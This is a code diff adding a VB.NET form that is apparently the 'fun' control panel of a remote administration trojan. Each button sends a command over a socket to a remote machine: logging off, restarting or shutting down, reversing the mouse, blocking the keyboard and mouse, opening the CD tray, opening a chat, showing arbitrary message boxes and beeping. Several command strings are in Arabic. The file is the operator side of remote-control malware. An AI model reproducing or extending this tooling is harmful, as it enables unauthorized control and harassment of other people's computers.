@@ -1,0 +1,182 @@
+﻿Public Class Fun
+    Public sock As Integer
+    Public f As Form1
+    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        f.s.Send(sock, "Logoff")
+    End Sub
+
+    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        f.s.Send(sock, "Restart")
+    End Sub
+    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
+        f.s.Send(sock, "Shutdown")
+    End Sub
+    Private Sub InfluenceButton11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton11.Click
+        f.s.Send(sock, "ReverseMouse")
+    End Sub
+    Private Sub InfluenceButton10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton10.Click
+        f.s.Send(sock, "NormalMouse")
+    End Sub
+    Private Sub InfluenceButton8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton8.Click
+
+        f.s.Send(sock, "blockmouseandkeyboard") ' ask server to block keyboard and mouse
+
+    End Sub
+    Private Sub InfluenceButton9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton9.Click
+
+        f.s.Send(sock, "unblockmouseandkeyboard") ' ask server to unblock keyboard and mouse
+
+    End Sub
+
+    Private Sub InfluenceButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton3.Click
+        f.s.Send(sock, "opencd")
+    End Sub
+
+    Private Sub InfluenceButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton4.Click
+        f.s.Send(sock, "closecd")
+    End Sub
+
+    Private Sub InfluenceButton12_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton12.Click
+        f.s.Send(sock, "s")
+    End Sub
+
+    Private Sub InfluenceButton13_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton13.Click
+        f.s.Send(sock, "s1")
+    End Sub
+
+    Private Sub InfluenceButton17_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton17.Click
+        f.s.Send(sock, "لوحة2")
+    End Sub
+
+    Private Sub InfluenceButton16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton16.Click
+        f.s.Send(sock, "لوحة1")
+    End Sub
+
+    Private Sub InfluenceButton15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton15.Click
+        f.s.Send(sock, "وين1")
+    End Sub
+
+    Private Sub InfluenceButton14_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton14.Click
+        f.s.Send(sock, "وين2")
+    End Sub
+
+    Private Sub InfluenceButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton5.Click
+        f.s.Send(sock, "shutdowncomputer")
+    End Sub
+
+    Private Sub InfluenceButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton6.Click
+        f.s.Send(sock, "restartcomputer")
+    End Sub
+
+    Private Sub InfluenceButton7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton7.Click
+        f.s.Send(sock, "logoff")
+    End Sub
+
+    Private Sub InfluenceButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton1.Click
+        f.s.Send(sock, "openchat")
+    End Sub
+
+    Private Sub InfluenceButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InfluenceButton2.Click
+        Dim msgtext As String = InputBox("Enter messagebox text :", "Messagebox Text")
+        Dim msgtitle As String = InputBox("Enter messagebox title :", "Messagebox Title")
+        Dim msgicon As String = InputBox("Enter number for msgbox icon:" & vbNewLine & "1 = Information" & vbNewLine & "2 = Question" & vbNewLine & "3 = Warning" & vbNewLine & "4 = Error", "Messagebox Icon")
+        Dim msgbutton As String = InputBox("Enter number for msgbox buttons:" & vbNewLine & "1 = Yes/No" & vbNewLine & "2 = Yes/No/Cancel" & vbNewLine & "3 = OK" & vbNewLine & "4 = OKCancel" & vbNewLine & "5 = RetryCancel" & vbNewLine & "6 = AbortRetryIgnore", "Messagebox Buttons")
+
+        f.s.Send(sock, "msgbox" & "||" & msgicon & "||" & msgbutton & "||" & msgtitle & "||" & msgtext) ' ask server to pop msgbox
+
+    End Sub
+
+
+    Private Sub Button39_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button39.Click
+        Form1.s.Send(sock, "ErorrMsg" & Form1.yy & messageicon & Form1.yy & messagebutton & Form1.yy & title & Form1.yy & message)
+    End Sub
+
+
+    Public ReadOnly Property title
+        Get
+            Return TextBox6.Text
+        End Get
+    End Property
+    Public ReadOnly Property message
+        Get
+            Return TextBox5.Text
+        End Get
+    End Property
+    Public ReadOnly Property messageicon
+        Get
+            If RadioButton1.Checked Then
+                Return "1"
+            ElseIf RadioButton2.Checked Then
+                Return "2"
+            ElseIf RadioButton3.Checked Then
+                Return "3"
+            ElseIf RadioButton4.Checked Then
+                Return "4"
+            Else
+                Return "1"
+            End If
+        End Get
+    End Property
+    Public ReadOnly Property messagebutton
+        Get
+            If RadioButton5.Checked Then
+                Return "1"
+            ElseIf RadioButton6.Checked Then
+                Return "2"
+            ElseIf RadioButton7.Checked Then
+                Return "3"
+            ElseIf RadioButton8.Checked Then
+                Return "4"
+            ElseIf RadioButton9.Checked Then
+                Return "5"
+            ElseIf RadioButton10.Checked Then
+                Return "6"
+            Else
+                Return "1"
+            End If
+        End Get
+    End Property
+
+    Private Sub Button38_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button38.Click
+        Dim x As MessageBoxIcon
+        Dim y As MessageBoxButtons
+
+        If RadioButton1.Checked = True Then
+            x = MessageBoxIcon.Information
+        ElseIf RadioButton2.Checked Then
+            x = MessageBoxIcon.Question
+        ElseIf RadioButton3.Checked Then
+            x = MessageBoxIcon.Warning
+        ElseIf RadioButton4.Checked Then
+            x = MessageBoxIcon.Error
+        Else
+            x = MessageBoxIcon.Asterisk
+        End If
+        '#################################################################"
+        If RadioButton5.Checked Then
+            y = MessageBoxButtons.YesNo
+
+        ElseIf RadioButton6.Checked Then
+            y = MessageBoxButtons.YesNoCancel
+        ElseIf RadioButton7.Checked Then
+            y = MessageBoxButtons.OK
+        ElseIf RadioButton8.Checked Then
+            y = MessageBoxButtons.OKCancel
+        ElseIf RadioButton9.Checked Then
+            y = MessageBoxButtons.RetryCancel
+
+        ElseIf RadioButton10.Checked Then
+            y = MessageBoxButtons.AbortRetryIgnore
+        Else
+            y = MessageBoxButtons.OK
+        End If
+        MessageBox.Show(TextBox5.Text, TextBox6.Text, y, x)
+
+    End Sub
+
+    Private Sub Button35_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button35.Click
+        Form1.s.Send(sock, "BepX" & Form1.yy & TextBox2.Text & Form1.yy & TextBox3.Text)
+    End Sub
+
+
+End Class
